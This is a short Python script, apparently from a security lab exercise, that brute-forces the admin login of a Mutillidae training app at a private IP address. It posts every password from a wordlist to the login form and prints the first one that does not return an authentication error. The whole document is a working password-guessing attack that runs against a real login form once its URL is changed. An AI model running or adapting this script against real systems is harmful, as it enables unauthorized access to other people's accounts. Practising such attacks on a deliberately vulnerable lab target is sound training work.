import requests

target_url = "http://192.168.159.153/mutillidae/?page=login.php"

def password_cracker(username,password):
    data_dict = {"username":username,"password":password,"login-php-submit-button":"submit"}
    return requests.post(target_url, data=data_dict)

with open("passwords.txt.1","r") as f:
    passwords = f.readlines()
    for password in passwords:
        password = password.strip()
        response = password_cracker(username="admin",password=password)
        if "Authentication Error" not in str(response.content):
            print("[-] Response.content:"+str(response.content))
            print("[+] Password Cracked!: " + password)
            exit()

print("[-] Password not found")
